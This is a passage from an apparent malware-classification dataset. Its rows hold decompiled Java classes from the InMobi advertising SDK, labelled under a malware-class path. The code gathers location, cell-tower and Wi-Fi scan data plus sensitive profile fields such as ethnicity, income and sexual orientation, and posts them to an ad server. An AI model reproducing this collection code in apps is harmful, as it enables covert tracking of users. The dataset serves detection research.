""]""));       if (this.f != null) {         jSONObject=this.f.process(jSONObject);       }       String jSONObject2=jSONObject.toString();       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""sending "" + jSONObject2 + "" to url :""+ this.a.getUrl());       MetricEndPoint.sendData(this.a.getUrl(),jSONObject2);       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""data sent successfully to url :"" + this.a.getUrl());       resetFile();       if (this.l != null) {         this.l.reportingSuccess();       }     }  catch (    Exception e2) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Unable to send data"");       if (this.l != null) {         this.l.reportingFailure();       }     }     this.j.set(false);     try { synchronized (this.j) {         this.j.notify();       }     }  catch (    Exception e3) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Unable to lock file."");     }     this.k.set(false);   }   public void saveToLatest(){     saveLocalCache();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.network\RequestBuilder.code","public class RequestBuilder {   public String buildPostBody(){     StringBuffer stringBuffer=new StringBuffer();     try {       String sDKDelegatePostBody=getSDKDelegatePostBody();       String devicePostBody=getDevicePostBody();       String applicationPostBody=getApplicationPostBody();       String publisherPostBody=getPublisherPostBody();       String adFormatPostBody=getAdFormatPostBody();       String uidMapPostBody=getUidMapPostBody();       if (sDKDelegatePostBody != null && !"""".equals(sDKDelegatePostBody.trim())) {         stringBuffer.append(sDKDelegatePostBody);       }       if (devicePostBody != null && !"""".equals(devicePostBody.trim())) {         stringBuffer.append(""&"" + devicePostBody);       }       if (applicationPostBody != null && !"""".equals(applicationPostBody.trim())) {         stringBuffer.append(""&"" + applicationPostBody);       }       if (publisherPostBody != null && !"""".equals(publisherPostBody.trim())) {         stringBuffer.append(""&"" + publisherPostBody);       }       if (adFormatPostBody != null && !"""".equals(adFormatPostBody.trim())) {         stringBuffer.append(""&"" + adFormatPostBody);       }       if (uidMapPostBody != null && !"""".equals(uidMapPostBody.trim())) {         stringBuffer.append(""&"" + uidMapPostBody);       }     }  catch (    Exception e) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Exception occured in an ad request"" + e);     }     return stringBuffer.toString();   }   protected String getSDKDelegatePostBody(){     WifiInfo wifiInfo;     try {       StringBuilder sb=new StringBuilder();       UserInfo userInfo=UserInfo.getInstance();       try {         wifiInfo=IceDataCollector.getConnectedWifiInfo(InternalSDKUtil.getContext());       }  catch (      Exception e) {         Log.internal(InternalSDKUtil.LOGGING_TAG,""No wifi permissions set, unable to send wifi data"");         wifiInfo=null;       }       if (userInfo.getPostalCode() != null) {         sb.append(""u-postalCode="");         sb.append(getURLEncoded(userInfo.getPostalCode()));       }       if (userInfo.getAreaCode() != null) {         sb.append(""&u-areaCode="");         sb.append(getURLEncoded(userInfo.getAreaCode()));       }       String a=a(userInfo.getDateOfBirth());       if (a != null) {         sb.append(""&u-dateOfBirth="");         sb.append(getURLEncoded(a));       }       if (userInfo.getGender() != null) {         sb.append(""&u-gender="");         sb.append(userInfo.getGender().toString().toLowerCase());       }       if (userInfo.getSearchString() != null) {         sb.append(""&p-type="");         sb.append(getURLEncoded(userInfo.getSearchString()));       }       if (userInfo.getIncome().intValue() > 0) {         sb.append(""&u-income="");         sb.append(userInfo.getIncome());       }       if (userInfo.getEducation() != null) {         sb.append(""&u-education="");         sb.append(userInfo.getEducation().toString().toLowerCase());       }       if (userInfo.getEthnicity() != null) {         sb.append(""&u-ethnicity="");         sb.append(userInfo.getEthnicity().toString().toLowerCase());       }       if (userInfo.getAge().intValue() > 0) {         sb.append(""&u-age="");         sb.append(userInfo.getAge());       }       if (userInfo.getInterests() != null) {         sb.append(""&u-interests="");         sb.append(getURLEncoded(userInfo.getInterests()));       }       if (userInfo.getLocationWithCityStateCountry() != null) {         sb.append(""&u-location="");         sb.append(getURLEncoded(userInfo.getLocationWithCityStateCountry()));       }       if (userInfo.getMaritalStatus() != null) {         sb.append(""&u-marital="");         sb.append(userInfo.getMaritalStatus().toString().toLowerCase());       }       if (userInfo.getHasChildren() != null) {         sb.append(""&u-haschildren="");         sb.append(userInfo.getHasChildren().toString().toLowerCase());       }       if (userInfo.getLanguage() != null) {         sb.append(""&u-language="");         sb.append(getURLEncoded(userInfo.getLanguage()));       }       if (userInfo.getSexualOrientation() != null) {         sb.append(""&u-sexualorientation="");         sb.append(userInfo.getSexualOrientation().toString().toLowerCase());       }       Calendar calendar=Calendar.getInstance();       System.currentTimeMillis();       sb.append(""&ts="" + calendar.getTimeInMillis());       sb.append(""&tz="").append(calendar.get(16) + calendar.get(15));       if (wifiInfo != null) {         sb.append(""&c-ap-bssid="" + wifiInfo.bssid);       }       try {         String str=CellUtil.getCurrentCellTower(InternalSDKUtil.getContext()).id;         if (str != null && !"""".equals(str)) {           sb.append(""&c-sid="" + str);         }       }  catch (      Exception e2) {         Log.internal(InternalSDKUtil.LOGGING_TAG,""Couldn't get cell tower info in Request Builder"",e2);       }       String sb2=sb.toString();       try {         if (sb2.charAt(0) == '&') {           return sb2.substring(1);         }         return sb2;       }  catch (      Exception e3) {         Log.internal(InternalSDKUtil.LOGGING_TAG,""Couldn't build post string in Request Builder"",e3);         return sb2;       }     }  catch (    Exception e4) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Couldn't build post string in Request Builder"",e4);       return null;     }   }   protected String getDevicePostBody(){     try {       StringBuilder sb=new StringBuilder();       if (DeviceInfo.getScreenDensity() != null) {         sb.append(""d-device-screen-density="").append(getURLEncoded(DeviceInfo.getScreenDensity()));       }       if (DeviceInfo.getScreenSize() != null) {         sb.append(""&d-device-screen-size="").append(getURLEncoded(DeviceInfo.getScreenSize()));       }       if (DeviceInfo.getOrientation() != 0) {         sb.append(""&d-orientation="");         sb.append(DeviceInfo.getOrientation());       }       if (DeviceInfo.getAid() != null) {         sb.append(""&aid="");         sb.append(getURLEncoded(DeviceInfo.getAid()));       }       if (DeviceInfo.getNetworkType() != null) {         sb.append(""&d-netType="");         sb.append(getURLEncoded(DeviceInfo.getNetworkType()));       }       sb.append(""&d-localization="");       sb.append(getURLEncoded(DeviceInfo.getLocalization()));       if (LocationInfo.isValidGeoInfo()) {         sb.append(""&u-latlong-accu="");         sb.append(getURLEncoded(currentLocationStr()));         sb.append(""&u-ll-ts="");         sb.append(LocationInfo.getGeoTS());       }       String sb2=sb.toString();       try {         if (sb2.charAt(0) == '&') {           return sb2.substring(1);         }         return sb2;       }  catch (      Exception e) {         Log.internal(InternalSDKUtil.LOGGING_TAG,""Couldn't build post string in Request Builder"",e);         return sb2;       }     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Couldn't build post string in Request Builder"",e2);       return null;     }   }   protected String getApplicationPostBody(){     try {       StringBuilder sb=new StringBuilder();       if (AppInfo.getAppId() != null) {         sb.append(""mk-siteid="");         sb.append(getURLEncoded(AppInfo.getAppId()));       }  else {         sb.append(""mk-siteid="");         sb.append(getURLEncoded(InMobi.getAppId()));       }       sb.append(""&mk-version="");       String str=""pr-SAND-"" + InternalSDKUtil.getInMobiInternalVersion(""4.1.1"") + ""-""+ InternalSDKUtil.INMOBI_SDK_RELEASE_DATE;       sb.append(getURLEncoded(str));       sb.append(""&mk-rel-version="");       sb.append(getURLEncoded(str));       sb.append(""&h-user-agent="");       sb.append(getURLEncoded(DeviceInfo.getPhoneDefaultUserAgent()));       sb.append(""&u-appbid="");       sb.append(getURLEncoded(AppInfo.getAppBId()));       sb.append(""&u-appDNM="");       sb.append(getURLEncoded(AppInfo.getAppDisplayName()));       sb.append(""&u-appver="");       sb.append(getURLEncoded(AppInfo.getAppVer()));       String sb2=sb.toString();       try {         if (sb2.charAt(0) == '&') {           return sb2.substring(1);         }         return sb2;       }  catch (      Exception e) {         Log.internal(InternalSDKUtil.LOGGING_TAG,""Couldn't build post string in Request Builder"",e);         return sb2;       }     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Couldn't build post string in Request Builder"",e2);       return null;     }   }   protected String getUidMapPostBody(){     Long l;     HashMap hashMap=new HashMap();     try {       l=AnalyticsInitializer.getConfigParams().getLTVId();     }  catch (    Exception e) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""LTVID not available yet in configs"");       l=null;     }     if (l != null) {       hashMap.put(""LTVID"",l + """");     }     String num=Integer.toString(new Random().nextInt());     String uidMap=UID.getCommonsUid().getUidMap(UserInfo.getInstance().getDeviceIDMask(),num,hashMap);     StringBuilder sb=new StringBuilder();     if (uidMap == null) {       return null;     }     sb.append(""u-id-map="");     sb.append(getURLEncoded(uidMap));     sb.append(""&u-id-key="");     sb.append(num);     sb.append(""&u-key-ver="");     sb.append(UIDHelper.getRSAKeyVersion());     String sb2=sb.toString();     try {       if (sb2.charAt(0) == '&') {         return sb2.substring(1);       }       return sb2;     }  catch (    Exception e2) {       Log.internal(InternalSDKUtil.LOGGING_TAG,""Couldn't build post string in Request Builder"",e2);       return sb2;     }   }   protected String getAdFormatPostBody(){     return ""format=imai&mk-ads=1"";   }   protected String getPublisherPostBody(){     return null;   }   public static String currentLocationStr(){     StringBuilder sb=new StringBuilder();     if (sb == null || !LocationInfo.isValidGeoInfo()) {       return """";     }     sb.append(LocationInfo.getLat());     sb.append("","");     sb.append(LocationInfo.getLon());     sb.append("","");     sb.append((int)LocationInfo.getLocAccuracy());     return sb.toString();   }   public static String getURLEncoded(  String str){     try {       return URLEncoder.encode(str,""UTF-8"");     }  catch (    Exception e) {       return """";     }   }   public static String getURLDecoded(  String str,  String str2){     try {       return URLDecoder.decode(str,str2);     }  catch (    Exception e) {       return """";     }   }   private String a(  Calendar calendar){     if (calendar == null) {       return null;     }     return calendar.get(1) + ""-"" + (calendar.get(2) + 1)+ ""-""+ calendar.get(5);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.cellular\a.code","static class a {   a(){   }   static int a(  Context context){     try {       ArrayList arrayList=(ArrayList)TelephonyManager.class.getMethod(""getAllCellInfo"",(Class[])null).invoke((TelephonyManager)context.getSystemService(""phone""),(Object[])null);       if (arrayList != null) {         return ((Integer)Class.forName(""android.telephony.CellSignalStrengthGsm"").getMethod(""getDbm"",(Class[])null).invoke(Class.forName(""android.telephony.CellInfoGsm"").getMethod(""getCellSignalStrength"",(Class[])null).invoke(arrayList.get(0),(Object[])null),(Object[])null)).intValue();       }     }  catch (    Exception e) {       if (BuildSettings.DEBUG) {         Log.e(IceDataCollector.TAG,""Error getting cell tower signal strength"",e);       }     }     return 0;   }   static int b(  Context context){     try {       ArrayList arrayList=(ArrayList)TelephonyManager.class.getMethod(""getAllCellInfo"",(Class[])null).invoke((TelephonyManager)context.getSystemService(""phone""),(Object[])null);       if (arrayList != null) {         return ((Integer)Class.forName(""android.telephony.CellSignalStrengthCdma"").getMethod(""getDbm"",(Class[])null).invoke(Class.forName(""android.telephony.CellInfoCdma"").getMethod(""getCellSignalStrength"",(Class[])null).invoke(arrayList.get(0),(Object[])null),(Object[])null)).intValue();       }     }  catch (    Exception e) {       if (BuildSettings.DEBUG) {         Log.e(IceDataCollector.TAG,""Error getting cell tower signal strength"",e);       }     }     return 0;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.cellular\CellOperatorInfo.code","public final class CellOperatorInfo {   public static final int MCC_NOT_AVAILABLE=-1;   public static final int MNC_NOT_AVAILABLE=-1;   public int currentMcc;   public int currentMnc;   public int simMcc;   public int simMnc;   public String toString(){     StringBuilder sb=new StringBuilder();     sb.append(getClass().getSimpleName()).append(""["");     sb.append(""currentMcc="").append(this.currentMcc).append("", "");     sb.append(""currentMnc="").append(this.currentMnc).append("", "");     sb.append(""simMcc="").append(this.simMcc).append("", "");     sb.append(""simMnc="").append(this.simMnc);     sb.append(""]"");     return sb.toString();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.cellular\CellTowerInfo.code","public final class CellTowerInfo {   public String id;   public int signalStrength;   public String toString(){     StringBuilder sb=new StringBuilder();     sb.append(getClass().getSimpleName()).append(""["");     sb.append(""id="").append(this.id).append("", "");     sb.append(""ss="").append(this.signalStrength).append("", "");     sb.append(""]"");     return sb.toString();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.cellular\CellUtil.code","public final class CellUtil {   private static final String[] a={""android.permission.ACCESS_COARSE_LOCATION""};   private static int[] a(  String str){     int[] iArr={-1,-1};     if (str != null && !str.equals("""")) {       try {         int parseInt=Integer.parseInt(str.substring(0,3));         int parseInt2=Integer.parseInt(str.substring(3));         iArr[0]=parseInt;         iArr[1]=parseInt2;       }  catch (      IndexOutOfBoundsException e) {       } catch (      NumberFormatException e2) {       }     }     return iArr;   }   public static CellOperatorInfo getCellNetworkInfo(  Context context){     CellOperatorInfo cellOperatorInfo=new CellOperatorInfo();     TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");     int[] a2=a(telephonyManager.getNetworkOperator());     cellOperatorInfo.currentMcc=a2[0];     cellOperatorInfo.currentMnc=a2[1];     int[] a3=a(telephonyManager.getSimOperator());     cellOperatorInfo.simMcc=a3[0];     cellOperatorInfo.simMnc=a3[1];     return cellOperatorInfo;   }   public static boolean hasGetCurrentServingCellPermission(  Context context){     for (    String str : a) {       if (context.checkCallingOrSelfPermission(str) != 0) {         return false;       }     }     return true;   }   public static CellTowerInfo getCurrentCellTower(  Context context){     TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");     int[] a2=a(telephonyManager.getNetworkOperator());     CellLocation cellLocation=telephonyManager.getCellLocation();     if (cellLocation == null || a2[0] == -1) {       return null;     }     CellTowerInfo cellTowerInfo=new CellTowerInfo();     String valueOf=String.valueOf(a2[0]);     String valueOf2=String.valueOf(a2[1]);     if (cellLocation instanceof CdmaCellLocation) {       CdmaCellLocation cdmaCellLocation=(CdmaCellLocation)cellLocation;       int networkId=cdmaCellLocation.getNetworkId();       int baseStationId=cdmaCellLocation.getBaseStationId();       int systemId=cdmaCellLocation.getSystemId();       cellTowerInfo.signalStrength=a.b(context);       if (networkId != -1 && baseStationId != -1 && systemId != -1) {         cellTowerInfo.id=valueOf + ""-"" + valueOf2+ ""-""+ Integer.toHexString(networkId)+ ""-""+ Integer.toHexString(baseStationId)+ ""-""+ Integer.toHexString(systemId);       }     }  else {       GsmCellLocation gsmCellLocation=(GsmCellLocation)cellLocation;       int cid=gsmCellLocation.getCid();       int lac=gsmCellLocation.getLac();       cellTowerInfo.signalStrength=a.a(context);       if (cid != -1 && lac != -1) {         cellTowerInfo.id=valueOf + ""-"" + valueOf2+ ""-""+ Integer.toHexString(lac)+ ""-""+ Integer.toHexString(cid);       }     }     return cellTowerInfo;   } static class a {     a(){     }     static int a(    Context context){       try {         ArrayList arrayList=(ArrayList)TelephonyManager.class.getMethod(""getAllCellInfo"",(Class[])null).invoke((TelephonyManager)context.getSystemService(""phone""),(Object[])null);         if (arrayList != null) {           return ((Integer)Class.forName(""android.telephony.CellSignalStrengthGsm"").getMethod(""getDbm"",(Class[])null).invoke(Class.forName(""android.telephony.CellInfoGsm"").getMethod(""getCellSignalStrength"",(Class[])null).invoke(arrayList.get(0),(Object[])null),(Object[])null)).intValue();         }       }  catch (      Exception e) {         if (BuildSettings.DEBUG) {           Log.e(IceDataCollector.TAG,""Error getting cell tower signal strength"",e);         }       }       return 0;     }     static int b(    Context context){       try {         ArrayList arrayList=(ArrayList)TelephonyManager.class.getMethod(""getAllCellInfo"",(Class[])null).invoke((TelephonyManager)context.getSystemService(""phone""),(Object[])null);         if (arrayList != null) {           return ((Integer)Class.forName(""android.telephony.CellSignalStrengthCdma"").getMethod(""getDbm"",(Class[])null).invoke(Class.forName(""android.telephony.CellInfoCdma"").getMethod(""getCellSignalStrength"",(Class[])null).invoke(arrayList.get(0),(Object[])null),(Object[])null)).intValue();         }       }  catch (      Exception e) {         if (BuildSettings.DEBUG) {           Log.e(IceDataCollector.TAG,""Error getting cell tower signal strength"",e);         }       }       return 0;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.icedatacollector\a.code","class a implements Runnable {   @Override public void run(){     Looper looper;     Handler handler;     Runnable runnable;     ThinICEConfigSettings thinICEConfigSettings;     ThinICEConfigSettings thinICEConfigSettings2;     ThinICEConfigSettings thinICEConfigSettings3;     ThinICEConfigSettings thinICEConfigSettings4;     Context context;     ThinICEConfigSettings thinICEConfigSettings5;     Context context2;     Context context3;     Context context4;     ThinICEConfigSettings thinICEConfigSettings6;     Context context5;     Context context6;     ThinICEConfigSettings thinICEConfigSettings7;     Context context7;     Context context8;     Object obj;     LinkedList linkedList;     LinkedList linkedList2;     LinkedList linkedList3;     ThinICEConfigSettings thinICEConfigSettings8;     LinkedList linkedList4;     ThinICEConfigSettings thinICEConfigSettings9;     Activity activity;     LinkedList linkedList5;     ThinICEListener thinICEListener;     ThinICEListener thinICEListener2;     if (BuildSettings.DEBUG) {       Log.d(IceDataCollector.TAG,""** sample runnable"");     }     looper=IceDataCollector.c;     if (looper == null) {       if (BuildSettings.DEBUG) {         Log.w(IceDataCollector.TAG,""sampling when looper is null, exiting"");         return;       }       return;     }     if (Build.VERSION.SDK_INT < 14) {       activity=IceDataCollector.f;       if (!activity.hasWindowFocus()) {         if (BuildSettings.DEBUG) {           Log.d(IceDataCollector.TAG,""activity no longer has focus, terminating"");         }         IceDataCollector.n();         linkedList5=IceDataCollector.h;         IceDataCollector.flush();         Context unused=IceDataCollector.a=null;         Activity unused2=IceDataCollector.f=null;         thinICEListener=IceDataCollector.k;         if (thinICEListener != null) {           thinICEListener2=IceDataCollector.k;           thinICEListener2.onSamplingTerminated(linkedList5);         }         ThinICEListener unused3=IceDataCollector.k=null;         return;       }     }     handler=IceDataCollector.d;     runnable=IceDataCollector.l;     thinICEConfigSettings=IceDataCollector.b;     handler.postDelayed(runnable,thinICEConfigSettings.getSampleInterval());     if (BuildSettings.DEBUG) {       StringBuilder append=new StringBuilder().append(""next sample in "");       thinICEConfigSettings9=IceDataCollector.b;       Log.d(IceDataCollector.TAG,append.append(thinICEConfigSettings9.getSampleInterval()).append("" ms"").toString());     }     Sample sample=new Sample();     thinICEConfigSettings2=IceDataCollector.b;     int wifiFlags=thinICEConfigSettings2.getWifiFlags();     boolean z=ThinICEConfigSettings.bitTest(wifiFlags,2) ? false : true;     boolean bitTest=ThinICEConfigSettings.bitTest(wifiFlags,1);     thinICEConfigSettings3=IceDataCollector.b;     int cellOpFlags=thinICEConfigSettings3.getCellOpFlags();     boolean bitTest2=ThinICEConfigSettings.bitTest(cellOpFlags,1);     boolean bitTest3=ThinICEConfigSettings.bitTest(cellOpFlags,2);     thinICEConfigSettings4=IceDataCollector.b;     if (thinICEConfigSettings4.isSampleCellOperatorEnabled()) {       try {         context=IceDataCollector.a;         CellOperatorInfo cellNetworkInfo=CellUtil.getCellNetworkInfo(context);         if (bitTest2) {           cellNetworkInfo.simMcc=-1;           cellNetworkInfo.simMnc=-1;         }         if (bitTest3) {           cellNetworkInfo.currentMcc=-1;           cellNetworkInfo.currentMnc=-1;         }         if (BuildSettings.DEBUG) {           Log.d(IceDataCollector.TAG,""-- cell operator: "" + cellNetworkInfo);         }         sample.cellOperator=cellNetworkInfo;       }  catch (      Exception e) {         if (BuildSettings.DEBUG) {           Log.e(IceDataCollector.TAG,""Error getting cell operator data"",e);         }       }     }     thinICEConfigSettings5=IceDataCollector.b;     if (thinICEConfigSettings5.isSampleCellEnabled()) {       try {         context2=IceDataCollector.a;         if (CellUtil.hasGetCurrentServingCellPermission(context2)) {           context3=IceDataCollector.a;           sample.connectedCellTowerInfo=CellUtil.getCurrentCellTower(context3);           if (BuildSettings.DEBUG) {             Log.d(IceDataCollector.TAG,""-- current serving cell: "" + sample.connectedCellTowerInfo.id);           }         }  else         if (BuildSettings.DEBUG) {           Log.w(IceDataCollector.TAG,""application does not have permission to access current serving cell"");         }       }  catch (      Exception e2) {         if (BuildSettings.DEBUG) {           Log.e(IceDataCollector.TAG,""Error getting cell data"",e2);         }       }     }     context4=IceDataCollector.a;     sample.connectedWifiAp=IceDataCollector.getConnectedWifiInfo(context4);     thinICEConfigSettings6=IceDataCollector.b;     if (thinICEConfigSettings6.isSampleLocationEnabled()) {       try {         context5=IceDataCollector.a;         if (LocationUtil.hasLocationPermission(context5)) {           context6=IceDataCollector.a;           HashMap<String,LocationInfo> lastKnownLocations=LocationUtil.getLastKnownLocations(context6);           if (BuildSettings.DEBUG) {             Log.d(IceDataCollector.TAG,""-- locations:"");             Iterator<LocationInfo> it=lastKnownLocations.values().iterator();             while (it.hasNext()) {               Log.d(IceDataCollector.TAG,""   + "" + it.next());             }           }           sample.lastKnownLocations=lastKnownLocations;         }  else         if (BuildSettings.DEBUG) {           Log.w(IceDataCollector.TAG,""application does not have permission to access location"");         }       }  catch (      Exception e3) {         if (BuildSettings.DEBUG) {           Log.e(IceDataCollector.TAG,""Error getting location data"",e3);         }       }     }     thinICEConfigSettings7=IceDataCollector.b;     if (thinICEConfigSettings7.isSampleVisibleWifiEnabled()) {       try {         context7=IceDataCollector.a;         if (WifiUtil.hasWifiScanPermission(context7,false)) {           context8=IceDataCollector.a;           WifiScanner.requestScan(context8,new C0022a(z,bitTest));         }  else         if (BuildSettings.DEBUG) {           Log.w(IceDataCollector.TAG,""application does not have permission to scan for wifi access points"");         }       }  catch (      Exception e4) {         if (BuildSettings.DEBUG) {           Log.e(IceDataCollector.TAG,""Error scanning for wifi"",e4);         }       }     }     obj=IceDataCollector.j; synchronized (obj) {       Sample unused4=IceDataCollector.i=sample;       linkedList=IceDataCollector.h;       if (linkedList != null) {         linkedList2=IceDataCollector.h;         linkedList2.add(sample);         while (true) {           linkedList3=IceDataCollector.h;           int size=linkedList3.size();           thinICEConfigSettings8=IceDataCollector.b;           if (size <= thinICEConfigSettings8.getSampleHistorySize()) {             break;           }           linkedList4=IceDataCollector.h;           linkedList4.removeFirst();         }       }     }   } class C0022a implements WifiScanListener {     final boolean a;     final boolean b;     C0022a(    boolean z,    boolean z2){       this.a=z;       this.b=z2;     }     @Override public void onTimeout(){       if (BuildSettings.DEBUG) {         Log.w(IceDataCollector.TAG,""Received Wi-Fi scan timeout"");       }     }     @Override public void onResultsReceived(    List<ScanResult> list){       Object obj;       Sample sample;       Sample sample2;       if (BuildSettings.DEBUG) {         Log.d(IceDataCollector.TAG,""Received Wi-Fi scan results "" + list.size());       }       List<WifiInfo> scanResultsToWifiInfos=WifiUtil.scanResultsToWifiInfos(list,this.a,this.b);       if (BuildSettings.DEBUG) {         Log.d(IceDataCollector.TAG,""-- wifi scan:"");         Iterator<WifiInfo> it=scanResultsToWifiInfos.iterator();         while (it.hasNext()) {           Log.d(IceDataCollector.TAG,""   + "" + it.next());         }       }       obj=IceDataCollector.j; synchronized (obj) {         sample=IceDataCollector.i;         if (sample != null) {           sample2=IceDataCollector.i;           sample2.visibleWifiAp=scanResultsToWifiInfos;         }       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.icedatacollector\b.code","class b implements Runnable {   @Override public void run(){     boolean z; synchronized (IceDataCollector.class) {       if (BuildSettings.DEBUG) {         Log.d(IceDataCollector.TAG,""** stop runnable"");       }       z=IceDataCollector.e;       if (!z) {         if (BuildSettings.DEBUG) {           Log.d(IceDataCollector.TAG,""ignoring, stop not requested"");         }         return;       }       if (BuildSettings.DEBUG) {         Log.d(IceDataCollector.TAG,""terminating sampling and flushing"");       }       IceDataCollector.n();       IceDataCollector.flush();       Context unused=IceDataCollector.a=null;       Activity unused2=IceDataCollector.f=null;       ThinICEListener unused3=IceDataCollector.k=null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.icedatacollector\BuildSettings.code","public class BuildSettings {   public static boolean DEBUG=false; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.icedatacollector\C0022a.code","class C0022a implements WifiScanListener {   final boolean a;   final boolean b;   C0022a(  boolean z,  boolean z2){     this.a=z;     this.b=z2;   }   @Override public void onTimeout(){     if (BuildSettings.DEBUG) {       Log.w(IceDataCollector.TAG,""Received Wi-Fi scan timeout"");     }   }   @Override public void onResultsReceived(  List<ScanResult> list){     Object obj;     Sample sample;     Sample sample2;     if (BuildSettings.DEBUG) {       Log.d(IceDataCollector.TAG,""Received Wi-Fi scan results "" + list.size());     }     List<WifiInfo> scanResultsToWifiInfos=WifiUtil.scanResultsToWifiInfos(list,this.a,this.b);     if (BuildSettings.DEBUG) {       Log.d(IceDataCollector.TAG,""-- wifi scan:"");       Iterator<WifiInfo> it=scanResultsToWifiInfos.iterator();       while (it.hasNext()) {         Log.d(IceDataCollector.TAG,""   + "" + it.next());       }     }     obj=IceDataCollector.j; synchronized (obj) {       sample=IceDataCollector.i;       if (sample != null) {         sample2=IceDataCollector.i;         sample2.visibleWifiAp=scanResultsToWifiInfos;       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.thinICE.icedatacollector\IceDataCollector.code","public final class IceDataCollector {   public static final String TAG=""IceDataCollector"";   private static Context a=null;   private static ThinICEConfigSettings b=new ThinICEConfigSettings();   private static Looper c=null;   private static Handler d=null;   private static boolean e=false;   private static Activity f=null;   private static Runnable g=new b();   private static LinkedList<Sample> h=new LinkedList<>();   private static Sample i=null;   private static final Object j=new Object();   private static ThinICEListener k=null;   private static Runnable l=new a();   public static synchronized void start(  Context context){ synchronized (IceDataCollector.class) {       if (BuildSettings.DEBUG) {         Log.d(TAG,""-- start()"");       }       if (context == null) {         if (BuildSettings.DEBUG) {           Log.d(TAG,""aborting, context is null"");         }       }  else       if (!b.isEnabled()) {         if (BuildSettings.DEBUG) {           Log.d(TAG,""ignoring, data collection is disabled in settings"");         }       }  else {         if (Build.VERSION.SDK_INT < 14) {           if (!(context instanceof Activity)) {             if (BuildSettings.DEBUG) {               Log.w(TAG,""aborting, build < 14 and context is not an activity"");             }           }  else {             f=(Activity)context;           }         }         a=context.getApplicationContext();         m();         if (e) {           if (BuildSettings.DEBUG) {             Log.d(TAG,""stop previously requested, clearing request"");           }           e=false;           d.removeCallbacks(g);         }       }     }   }   private static void m(){     if (BuildSettings.DEBUG) {       Log.d(TAG,""startSampling()"");     }     if (c != null) {       if (BuildSettings.DEBUG) {         Log.d(TAG,""ignoring, already sampling"");         return;       }       return;     }     HandlerThread handlerThread=new HandlerThread(""IDC"");     handlerThread.start();     c=handlerThread.getLooper();     d=new Handler(c);     d.postDelayed(l,b.getSampleInterval() / 2);     if (BuildSettings.DEBUG) {       Log.d(TAG,""next sample in "" + (b.getSampleInterval() / 2) + "" ms"");     }   }   public static synchronized void stop(){ synchronized (IceDataCollector.class) {       if (BuildSettings.DEBUG) {         Log.d(TAG,""-- stop()"");       }       if (c == null) {         Log.d(TAG,""ignoring, not currently running"");       }  else       if (e) {         Log.d(TAG,""ignoring, stop already requested"");       }  else {         e=true;         d.postDelayed(g,b.getStopRequestTimeout());         if (BuildSettings.DEBUG) {           Log.d(TAG,""stop requested, occurring in "" + b.getStopRequestTimeout() + "" ms"");         }       }     }   }   public static void n(){     if (BuildSettings.DEBUG) {       Log.d(TAG,""stopSampling()"");     }     if (c == null) {       if (BuildSettings.DEBUG) {         Log.d(TAG,""ignoring, not currently sampling"");         return;       }       return;     }     d.removeCallbacks(l);     d=null;     c.quit();     c=null;     if (BuildSettings.DEBUG) {       Log.d(TAG,""sampling stopped"");     }   }   public static synchronized void flush(){ synchronized (IceDataCollector.class) {       if (BuildSettings.DEBUG) {         Log.d(TAG,""-- flush()"");       } synchronized (j) {         i=null;         h=new LinkedList<>();       }     }   }   public static synchronized void setConfig(  ThinICEConfigSettings thinICEConfigSettings){ synchronized (IceDataCollector.class) {       if (BuildSettings.DEBUG) {         Log.d(TAG,""-- setConfig("" + thinICEConfigSettings + "")"");       }       if (thinICEConfigSettings == null) {         if (BuildSettings.DEBUG) {           Log.d(TAG,""aborting, config is null"");         }       }  else {         ThinICEConfigSettings thinICEConfigSettings2=b;         b=thinICEConfigSettings;         int sampleHistorySize=thinICEConfigSettings2.getSampleHistorySize();         int sampleHistorySize2=b.getSampleHistorySize();         if (sampleHistorySize2 < sampleHistorySize) { synchronized (j) {             if (h.size() > sampleHistorySize2) {               if (BuildSettings.DEBUG) {                 Log.d(TAG,""new sample history size, removing samples from start of list"");               }               h.subList(0,h.size() - sampleHistorySize2).clear();             }           }         }         if (c == null) {           if (BuildSettings.DEBUG) {             Log.d(TAG,""not restarting sampling, not currently sampling"");           }         }  else         if (a(thinICEConfigSettings2,b)) {           n();           if (b.isEnabled()) {             m();           }  else {             flush();             a=null;             f=null;             k=null;           }         }       }     }   }   private static final boolean a(  ThinICEConfigSettings thinICEConfigSettings,  ThinICEConfigSettings thinICEConfigSettings2){     return (thinICEConfigSettings.isEnabled() == thinICEConfigSettings2.isEnabled() && thinICEConfigSettings.getSampleInterval() == thinICEConfigSettings2.getSampleInterval()) ? false : true;   }   public static ThinICEConfigSettings 